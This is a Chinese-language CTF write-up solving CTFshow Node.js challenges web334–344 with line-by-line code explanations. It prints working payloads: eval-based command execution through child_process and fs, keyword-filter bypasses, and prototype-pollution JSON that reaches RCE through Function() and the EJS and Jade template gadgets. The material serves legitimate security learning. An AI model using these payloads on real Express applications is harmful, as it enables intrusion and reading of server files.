---
title: CTFshow nodejs板块web334~344全解
description: 学习一下Node.js
date: 2026-05-15 22:34:16
updated: 2026-05-15 22:34:16
image: https://img.yanxisishi.top/images/2026/05/222.png
categories: [CTF]
tags: [CTF, WP, ctfshow]
---

## web334

login.js 和 user.js 两个附件，代码审计一下，正好复习一些 Node.js 的语法和思路：

1. **引入模块与框架：**

   ```js
   var express = require('express');
   var router = express.Router();
   var users = require('../modules/user').items;
   ```

   1. 第一行：

      ```js
      var express = require('express');
      ```

      + `require()` 是 Node.js 里的模块引入方法，用来加载模块。
      + 加载的 `express` 不是 JavaScript 自带的东西，而是 Node.js Web 开发中常用的第三方框架。

      `var express` 定义了一个变量，用来接收 `require('express')` 返回的 Express 框架对象。

   2. 第二行：

      ```js
      var router = express.Router();
      ```

      + `express.Router()` 是 Express 提供的路由功能，用来创建一个路由对象。

      这里的 `router` 可以理解成一个专门管理当前文件路由的对象。

   3. 第三行：

      ```js
      var users = require('../modules/user').items;
      ```

      这里引入的是自己写的模块：

      ```js
      ../modules/user
      ```

      也就是上一级目录里的 `modules/user.js` 文件。

      + user.js：

        ```js
        module.exports = {
          items: [
            {username: 'CTFSHOW', password: '123456'}
          ]
        };
        ```

        先分清楚：

        ```txt
        module       Node.js 提供的内置对象，不需要人为定义，表示“当前这个 js 文件”
        exports      module 这个对象里的一个属性，表示“这个文件要导出的内容”
        module.exports  当前文件真正对外暴露的东西
        ```

        其次整体结构整理成：

        ```txt
        module.exports
        └── 对象 {}
            └── items 属性
                └── 数组 []
                    └── 用户对象 {}
                        ├── username: CTFSHOW
                        └── password: 123456
        ```

        JS 里面大括号 `{}` 表示手写对象，对象里面用 `键: 值` 的形式存数据。

      所以：

      ```js
      require('../modules/user')
      ```

      拿到的是整个导出的对象。

      而后面的：

      ```js
      .items
      ```

      表示只取这个对象里的 `items` 属性。

      因此最终 `users` 的值就是：

      ```js
      [
        {username: 'CTFSHOW', password: '123456'}
      ]
      ```

2. **POST 路由：**

   ```js
   router.post('/', function(req, res, next) {
   ```

   这是一个 `POST` 路由，说明请求需要用 `POST` 方式提交到 `/` 路径底下才能继续后面的代码。

3. **调用 `findUser()` 校验账号密码：**

   ```js
   var user = findUser(req.body.username, req.body.password);
   ```

   `findUser()` 是作者自定义的一个函数，定位到：

   ```js
   var findUser = function(name, password){
     return users.find(function(item){
       return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
     });
   };
   ```

   1. 第一行：

      ```js
      var findUser = function(name, password){
      ```

      这里用 `function(name, password)` 定义了一个函数变量 `findUser`，它接收两个参数 `name` 和 `password`。

   2. 第二行：

      ```js
      return users.find(
      ```

      + `users` 是前面从 `user.js` 里取出来的用户数组：

        ```js
        [
          {username: 'CTFSHOW', password: '123456'}
        ]
        ```

      + `.find()` 是 JavaScript 数组自带的方法，用来从数组里查找符合条件的元素。

        如果符合条件，就把这个元素返回；如果都不符合，就返回 undefined。

      后续 `.find()` 的括号里面要传入一个判断函数。

   3. 第三行：

      ```js
      function(item){
          return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
      }
      ```

      + `function(item)` 是传给 `.find()` 的判断函数，`item` 表示当前遍历到的用户对象。

        在本题中 `item` 只有：

        ```js
        {username: 'CTFSHOW', password: '123456'}
        ```

      这里用 `&&` 连接了三个条件，表示三个条件必须同时成立：

      1. `name!=='CTFSHOW'`

         传给该函数的 `name` 值不能是 `CTFSHOW`。

      2. `item.username === name.toUpperCase()`

         传给该函数的 `name` 值转为大写后要与 `item.username` 的值相等，即等于 `CTFSHOW`。

      3. `item.password === password`

         传给该函数的 `password` 值要与 `item.password` 的值相等，即等于 `123456`。

      只要这个判断函数返回 `true`，`.find()` 就会认为找到了符合条件的元素，并把当前的 `item` 返回出去，即源码中定义的 `user` 变量的值。

4. **flag 返回逻辑：**

   ```js
   if(user){
       req.session.regenerate(function(err) {
           if(err){
               return res.json({ret_code: 2, ret_msg: '登录失败'});
           }
           
           req.session.loginUser = user.username;
           res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});
       });
   }else{
       res.json({ret_code: 1, ret_msg: '账号或密码错误'});
   ```

   1. 这里先判断：

      ```js
      if(user)
      ```

      也就是判断前面的 `findUser()` 有没有成功找到可以返回的元素。如果 `user` 不是 `undefined`，说明账号密码校验成功，就会进入登录成功逻辑。

   2. 中间的：

      ```js
      req.session.regenerate(
      ```

      + `req.session`：表示当前请求对应的 **session 对象**，可以用来保存登录状态等数据，比如把用户名存到 `req.session.loginUser` 里。
      + `req.session.regenerate()`：表示重新生成一个新的 session，常用于登录成功后刷新 session，防止继续使用旧 session。

   3. 后续的：

      ```js
      function(err) {
          if(err){
              return res.json({ret_code: 2, ret_msg: '登录失败'});
          }
          
          req.session.loginUser = user.username;
          res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});
      }
      ```

      重新生成 session 时，如果出错了，错误信息就会放到 err 里，接着返回登录失败并阻止后续代码进行；如果没出错，err 就是空的，返回登录成功和 flag。

5. **构造 payload：**

   大小写绕过，传入 `ctfshow/123456` 后，弹窗得到 flag。

## web335

查看源码有：

```html
<!-- /?eval= -->
```

结合题目是 Node.js，传入：

```http
?eval=require('child_process').execSync('ls').toString()
```

其中：

1. **`require('child_process')` —— 引入模块**
   + `require()` 是 Node.js 里的模块加载函数，用来引入模块。
   + `child_process` 是 Node.js 内置模块，作用是创建子进程，也就是让 Node.js 去执行系统命令。
2. **`.execSync('ls')` —— 执行命令**
   + `execSync()` 是 `child_process` 模块里的函数，作用是同步执行一条系统命令。
3. **`.toString()` —— 转换结果**
   - `execSync('ls')` 执行命令后返回的是 `Buffer`，即 Node.js 里表示二进制数据的对象，不是普通字符串。
   - `.toString()` 的作用是把 `Buffer` 转成字符串，这样页面才能正常显示命令执行结果。

返回结果中找到 fl00g.txt。

接着再传入：

```http
?eval=require('child_process').execSync('cat fl00g.txt').toString()
```

拿到 flag。

还可以传入：

```http
?eval=require('fs').readFileSync('fl00g.txt').toString()
```

或：

```http
?eval=require('fs').readFileSync('fl00g.txt','utf8')
```

其中：

1. `fs` 是 Node.js 内置模块，作用是操作文件，比如读取文件、写入文件、判断文件是否存在等。
2. `readFileSync()` 是 `fs` 模块里的函数，作用是同步读取文件内容。这里第二个参数 `'utf8'` 表示按 UTF-8 编码读取文件。

不过本题的后端返回逻辑可以直接处理 `Buffer`，所以不加 `.toString()` 或 `'utf8'` 也能看到结果。

## web336

传入上题的：

```http
?eval=require('child_process').execSync('ls').toString()
```

返回：

```txt
tql
```

说明本题存在过滤。

经测试本题过滤了 `exec` 和 `load`，介绍三种方法：

1. **字符串拼接绕过关键字 `exec`：**

   在 JS 中，`对象.方法名` 等价于 `对象['方法名']`。既然可以放在中括号里变成字符串，那就可以用 `+` 对其进行拼接：

   ```http
   ?eval=require('child_process')['exe'+'cSync']('ls').toString()
   ```

   但是由于使用了 `+`，需要 URL 编码：

   ```http
   ?eval=require('child_process')['exe'%2B'cSync']('ls').toString()
   ```

   ```http
   ?eval=require('child_process')['exe'%2B'cSync']('cat fl001g.txt').toString()
   ```

2. **使用 `child_process` 模块的其他同族方法 `spawnSync`：**

   `spawn` （同步衍生子进程）是 Node.js 底层创建子进程最基础的方法，其他的 `exec` 很多都是基于它封装的。

   + **工作原理：** 它默认不启动 Linux 操作系统的 shell 环境（比如 bash），直接去寻找要执行的那个程序（比如 `ls` 或 `cat`）。
   + **参数特点：** 因为它不通过 shell，所以它不能像 `execSync('cat fl00g.txt')` 那样把整个句子传进去。**必须把“命令”和“参数”严格分开，参数要放在一个数组 `[]` 里。**
   + **返回结果：** `spawnSync()` 返回的不是直接的命令结果字符串，而是一个结果对象，命令正常执行后的输出保存在 `stdout` 里，且 `stdout` 默认还是 `Buffer`。

   ```http
   ?eval=require('child_process').spawnSync('ls').stdout.toString()
   ```

   ```http
   ?eval=require('child_process').spawnSync('cat', ['fl001g.txt']).stdout.toString()
   ```

3. **使用 `fs` 模块读文件：**

   1. 查看目录，使用 `readdirSync` (同步读取目录) 方法，`.` 代表当前目录：

      ```http
      ?eval=require('fs').readdirSync('.').toString();
      ```

   2. 读取文件内容，使用 `readFileSync` (同步读取文件) 方法：

      ```http
      ?eval=require('fs').readFileSync('fl001g.txt').toString();
      ```


## web337

1. **看路由：**

   ```js
   router.get('/', function(req, res, next) {
     var a = req.query.a;
     var b = req.query.b;
   ```

   这是一个 `GET` 路由，说明请求可以用 `GET` 方式往 `/` 路径底下传入 URL 查询参数 `a` 和 `b`。

2. **看 flag 返回逻辑：**

   ```js
   if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
       res.end(flag);
   ```

   说明需要同时满足：

   ```js
   a 和 b 存在
   a.length === b.length
   a !== b
   md5(a + flag) === md5(b + flag)
   ```

   出现了 Node.js 中不存在 `md5()` 函数。

3. **看自定义函数 `md5`：**

   ```js
   function md5(s) {
     return crypto.createHash('md5')
       .update(s)
       .digest('hex');
   }
   ```

   `md5(s)` 函数会把传入的 `s` 做 MD5 计算，然后返回十六进制格式的 MD5 值。

   所以：

   ```js
   md5(a + flag) === md5(b + flag)
   ```

   就是判断 a+flag 和 b+flag 这两个内容算出来的 MD5 是否相同。

4. **构造 payload：**

   传入：

   ```http
   ?a[]=1&b[]=1
   ```

   此时后端拿到的请求是：

   ```js
   a = ['1']
   b = ['1']
   ```

   这时逐个判断：

   1. `a && b`

      两个数组都存在，成立。

   2. `a.length === b.length`

      `a` 和 `b` 都是长度为 1 的数组，成立。

   3. `a !== b`

      虽然两个数组内容一样，但在 JavaScript 里，数组是对象。

      对象之间用 `===` 或 `!==` 比较时，不比较内容，而是比较它们是不是同一个对象。

      所以严格比较时不相等，成立。

   4. `md5(a + flag) === md5(b + flag)`

      数组和字符串拼接时，数组会先被转成字符串：

      ```js
      ['1'] + flag
      ```

      等价于：

      ```js
      '1' + flag
      ```

      因为 `a` 和 `b` 的内容一样，所以 `a + flag` 和 `b + flag` 得到的字符串一样，MD5 结果自然也一样。

   所以最终 payload：

   ```http
   ?a[]=1&b[]=1
   ```

   访问后拿到 flag。

   还可以传入：

   ```http
   ?a=1&a=2&b=1&b=2
   ```

   这种同名参数重复出现，在 Express 的 `req.query` 里通常会被解析成数组。后端拿到的大概就是：

   ```js
   a = ['1', '2']
   b = ['1', '2']
   ```

   目的都是让 `a` 和 `b` 变成内容相同、但不是同一个对象的数组。

## web338

1. **看路由**

   路由配置文件一般就在附件的第一层，不需要进到别的文件夹找，看到 app.js：

   ```js
   var indexRouter = require('./routes/index');
   var loginRouter = require('./routes/login');
   
   app.use('/', indexRouter);
   app.use('/login', loginRouter);
   ```

   这里存在两个路由 `/` 和 `/login`，分别对应附件的 ./routes/index.js 和 ./routes/login.js。

2. **看首页渲染逻辑**

   去到附件的 routes 文件夹找，先看到 routes/index.js，这里对应靶机的 `/` 路由：

   ```js
   router.get('/', function(req, res, next) {
     res.type('html');
     res.render('index', { title: 'Express' });
   });
   ```

   就是访问 `/` 路由会渲染 index.ejs 作为首页，没什么好看的。

3. **看 flag 返回逻辑**

   再看到 routes/login.js，这里对应靶机的 `/login` 路由：

   ```js
   router.post('/', require('body-parser').json(),function(req, res, next) {
     res.type('html');
     var flag='flag_here';
     var secert = {};
     var sess = req.session;
     let user = {};
     utils.copy(user,req.body);
       
     if(secert.ctfshow==='36dboy'){
       res.end(flag);
     }else{
       return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
     }
   });
   ```

   > **require('body-parser').json()**
   >
   > + `body-parser` 是第三方 npm 库
   >
   > + `json()` 是该库提供的解析 JSON 的方法
   >
   > 用于把 POST 请求体中的 JSON 数据解析出来，并保存到 `req.body` 中，方便后续代码读取用户传入的数据。

   这里看到了 flag 的返回逻辑：

   ```js
   if(secert.ctfshow==='36dboy'){
     res.end(flag);
   ```

   说明 `secert` 对象如果得到一个这样的属性：

   ```js
   ctfshow: "36dboy"
   ```

   就能返回 flag。

4. **定位漏洞函数**

   login.js 中有一串很突兀的代码：

   ```js
   utils.copy(user,req.body);
   ```

   意思是调用了` utils` 模块的 `copy()` 方法。

   去到附件的 utils 文件夹找到 common.js，这里有对 `copy()` 方法的定义：

   ```js
   function copy(object1, object2){
       for (let key in object2) {
           if (key in object2 && key in object1) {
               copy(object1[key], object2[key])
           } else {
               object1[key] = object2[key]
           }
       }
   }
   ```

   意思是这个 `copy()` 函数会遍历 `object2` 的属性，把它们递归复制到 `object1` 中。这是一个极有可能导致原型链污染的自定义函数代码。

   回到 login.js 中：

   ```js
   utils.copy(user,req.body);
   ```

   意思就是 `copy()` 函数会把可控的对象 `req.body` 的属性递归复制到对象 `user` 中。

5. **构造 payload**

   目前已知：

   1. 可以在 `/login` 路由下用 POST 的请求方式传入 JSON 数据，并被保存到 `req.body` 中。

   2. `copy()` 函数会把可控的对象 `req.body` 的属性递归复制到对象 `user` 中。

   3. 定义变量时有：

      ```js
      var secert = {};
      let user = {};
      ```

      这两个都是普通对象，默认都继承自 `Object.prototype`，即它们的原型对象都是 `Object.prototype`。

   4. 若 `secert` 对象存在属性：

      ```js
      ctfshow: "36dboy"
      ```

      就能返回 flag。

   所以本题可以：

   1. 在 `/login` 路径下 POST 传入携带 `__proto__` 属性的恶意 JSON 数据：

      ```json
      {"__proto__":{"ctfshow":"36dboy"}}
      ```

      > `__proto__` 是 JS 对象上的特殊属性，可以用来访问这个对象的原型。

   2. `copy()` 函数会污染 `user.__proto__` 即 `user` 原型对象 `Object.prototype`，给 `Object.prototype` 传入新属性：

      ```js
      ctfshow: "36dboy"
      ```

   3. 拥有相同原型对象的 `secert` 会继承被污染后得到的新属性。

   ![image-20260515190135435](https://img.yanxisishi.top/images/2026/05/image-20260515190135435.png)

## web339

1. **看路由**

   路由还是在 app.js：

   ```js
   var indexRouter = require('./routes/index');
   var loginRouter = require('./routes/login');
   var apiRouter = require('./routes/api');
   
   app.use('/', indexRouter);
   app.use('/login', loginRouter);
   app.use('/api',apiRouter);
   ```

   有三个路由 `/`、`/login`、`/api`。

2. **看 flag 返回逻辑**

   本题和上一题的不同之处就是这一题的 login.js 的返回 flag 的逻辑变成了：

   ```js
   if(secert.ctfshow===flag){
     res.end(flag);
   ```

   但要真知道 flag 还看啥源码。所以这题提供了另一个漏洞点 api.js：

   ```js
   router.post('/', require('body-parser').json(),function(req, res, next) {
     res.type('html');
     res.render('api', { query: Function(query)(query)});   
   });
   ```

   这里的核心是：

   ```js
   Function(query)(query)
   ```

   + `Function()` 可以把字符串当成 JS 代码来执行，类似于 `eval()`。
   + 第一个 `query` 是代码内容，第二个 `query` 是调用函数时传进去的参数。

   看到 views/api.html 中有：

   ```html
   <%= query%>
   ```

   说明 `/api` 的路由会把后端传进来的 `query` 变量显示出来。

   如果 `query` 的值是：

   ```js
   return 1
   ```

   那么就会执行 `Function(query)(query)` 这段代码并返回 `1`。

   即这里存在一个 RCE 任意代码执行的漏洞。

3. **构造 payload**

   在本题中没有地方定义过变量 `query`，正常情况下会 ReferenceError。

   但如果通过原型链污染，让全局对象的原型链上有了 query，那么未声明变量 query 会被解析成 Object.prototype.query。

   本题先在 `/login` 路由中 POST 传入 JSON 数据：

   ```json
   {"__proto__":{"query":"require('child_process').execSync('cat routes/login.js').toString()"}}
   ```

   但实际上这个 payload 是错误的，在 `/api` 中：

   ```js
   Function(query)(query)
   ```

   会被当成：

   ```js
   Function("require('child_process').execSync('cat routes/login.js').toString()")(query)
   ```

   但是其中：

   1. 函数体里没有 return，即使命令执行了，返回值也是 undefined，页面不会显示结果。

   2. `Function()` 创建出来的是一个新的函数作用域，里面通常不能直接使用 Node.js 模块里的 `require()`。

      需要通过全局对象 `process` 间接拿到模块加载能力，比如使用 `process.mainModule.require()` 或 `global.process.mainModule.constructor._load()` 来加载 `child_process`。

   所以更稳的 paylaod 其实是在 `/login` 路由中 POST 传入 JSON 数据：

   ```json
   {"__proto__": {"query": "return process.mainModule.require('child_process').execSync('cat routes/login.js').toString()"}}
   ```

   或：

   ```json
   {"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').execSync('cat routes/login.js').toString()"}}
   ```

   接着再访问 `/api` 路由，记得要以 POST 的请求方式随便发送条 JSON 数据，比如传入：

   ```json
   {"1":"1"}
   ```

   返回结果里拿到 flag。

## web340

login.js 的返回 flag 的逻辑又变成了：

```js
var user = new function(){
  this.userinfo = new function(){
  this.isVIP = false;
  this.isAdmin = false;
  this.isAuthor = false;     
  };
}
utils.copy(user.userinfo,req.body);
if(user.userinfo.isAdmin){
 res.end(flag);
```

api.js 则没有改动，仍然可以实现 RCE。

这里和上题的核心不同在于这里 `copy()` 方法作用的对象是 `user.userinfo`。

这里 `user.userinfo` 是通过 `new function(){}` 创建出来的对象，它的直接原型是匿名构造函数的 `prototype`，再往上一层才是 `Object.prototype`。所以要用两层 `__proto__` 才能污染到 `Object.prototype`。

在 `/login` 路由中 POST 传入 JSON 数据：

```json
{"__proto__":{"__proto__": {"query": "return process.mainModule.require('child_process').execSync('cat routes/login.js').toString()"}}}
```

再访问 `/api` 路由，以 POST 的请求方式随便发送条 JSON 数据，返回结果里拿到 flag。

## web341

本题给 api.js 去掉了，login.js 里面也没有了 flag 的返回逻辑，但是仍保留了：

```js
utils.copy(user.userinfo,req.body);
```

这里只能重新看回 index.js，存在：

```js
res.render('index');
```

说明访问 `/` 路由时会触发 EJS 模板渲染。

实际上本题考察的是污染 EJS 的配置项。这里利用的是 EJS 的 `outputFunctionName`，旧版本 EJS 在模板编译时会把它拼进函数代码里，所以如果能污染到：

```js
Object.prototype.outputFunctionName
```

就可以在模板渲染时执行命令。

> 这个利用点主要对应 EJS 3.1.6 及以下版本，3.1.7 开始对 `outputFunctionName` 做了标识符检查，不能直接塞分号命令。

EJS 正常会把 `outputFunctionName` 拼进类似这样的代码里：

```js
var outputFunctionName = __append;
```

污染后如果写成：

```js
x;return process.mainModule.require('child_process').execSync('cat /flag').toString();//
```

最终会变成：

```js
var x;return process.mainModule.require('child_process').execSync('cat /flag').toString();// = __append;
```

这里：

```txt
x       随便写的合法变量名，让 var x; 成立
;       截断前面的 var 语句
//      注释掉后面 EJS 自己拼接的 = __append
```

所以在 `/login` 路由下 POST 传入：

```json
{
  "__proto__": {
    "__proto__": {
      "outputFunctionName": "x;return process.mainModule.require('child_process').execSync('cat /flag').toString();//"
    }
  }
}
```



然后再访问 `/` 路由，触发：

```js
res.render('index');
```

EJS 渲染模板时读取到被污染的 `outputFunctionName`，最终执行 `cat /flag` 拿到 flag。（其实这个 EJS 配置项污染的 paylaod 也能做前面几题来的）

## web342

web341 前的 app.js 中的模板引擎为 ejs：

```js
app.engine('html', require('ejs').__express); 
app.set('view engine', 'html');
```

但在本题的 app.js 中改成了 jade：

```js
app.engine('jade', require('jade').__express); 
app.set('view engine', 'jade');
```

所以上一题污染 EJS 的：

```js
outputFunctionName
```

就不能用了。

这里需要换成污染 Jade 模板编译时会用到的属性，常见污染点是：

```js
type
compileDebug
self
line
```

其中重点是 `line`，Jade 在开启调试编译时会把行号信息拼进模板编译后的 JS 代码里，如果能污染 `line`，就可以把恶意 JS 代码插进去执行。

在 `/login` 路由下 POST 传入：

```json
{
  "__proto__": {
    "__proto__": {
      "type": "Code",
      "compileDebug": true,
      "self": true,
      "line": "0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString();//"
    }
  }
}
```

这里几个字段的作用简单理解：

```txt
type: "Code"          让 Jade 编译时把污染内容当成代码节点处理
compileDebug: true    开启调试编译，让 line 有机会被拼进代码
self: true            配合 Jade 编译选项使用
line                  真正插入 JS 代码的位置
```

`line` 里面的 payload 关键是：

```js
0, "" ));return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString();//
```

其中：

```txt
0, "" ))   闭合 Jade 原本拼接的代码结构
//         注释掉后面 Jade 自己拼接的剩余代码
```

然后访问 `/` 路由，触发：

```js
res.render('index',{title:'ctfshow'});
```

Jade 渲染模板时读取到被污染的属性，最终执行 `cat /flag` 拿到 flag。

## web343

提示是：

```txt
342基础上增加了过滤
```

但是对上题的 payload 没有影响。

## web344

题目底下给出源码：

```js
router.get('/', function(req, res, next) {
  res.type('html');
  var flag = 'flag_here';
  if(req.url.match(/8c|2c|\,/ig)){
  	res.end('where is flag :)');
  }
  var query = JSON.parse(req.query.query);
  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
  	res.end(flag);
  }else{
  	res.end('where is flag. :)');
  }

});
```

首先路由是：

```js
router.get('/', function(req, res, next) {
```

说明是 GET 传参。

后面有：

```js
var query = JSON.parse(req.query.query);
```

> `JSON.parse()` 的作用是把 **JSON 格式的字符串** 转成 **JavaScript 对象**。

说明需要在 URL 参数传入一个名为 `query` 的参数，然后后端会对它做 `JSON.parse()`。

正常想满足条件：

```js
if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
```

可以传入：

```http
?query={"name":"admin","password":"ctfshow","isVIP":true}
```

但是源码前面有过滤：

```
if(req.url.match(/8c|2c|\,/ig)){
  res.end('where is flag :)');
}
```

也就是说直接写逗号 `,` 不行，URL 编码成 `%2c` 也不行。

这里的关键点是：

如果同名参数 `query` 出现多次，Express 会把它解析成数组。比如传入：

```http
?query=aaa&query=bbb&query=ccc
```

后端拿到的就是：

```js
req.query.query = ['aaa', 'bbb', 'ccc']
```

而 `JSON.parse()` 接收到数组时，会先把数组转成字符串，而数组转字符串时，默认会用逗号拼接：

```js
['aaa', 'bbb', 'ccc'].toString()
```

结果就是：

```js
aaa,bbb,ccc
```

所以这里可以不在 URL 里直接写逗号，而是用多个 `query` 参数，让服务器自己在数组转字符串时生成逗号。

把原本的 JSON：

```json
{"name":"admin","password":"ctfshow","isVIP":true}
```

拆成三段：

```json
{"name":"admin"
"password":"ctfshow"
"isVIP":true}
```

然后分别放进三个 `query` 参数里：

```http
?query={"name":"admin"&query="password":"ctfshow"&query="isVIP":true}
```

但是这里需要注意，因为双引号的 URL 编码是 %22 ，再和 c 连接起来就是 %22c，会匹配到正则表达式。所以传入 payload 的时候需要把 c 进行 URL 编码一次：

```http
?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
```
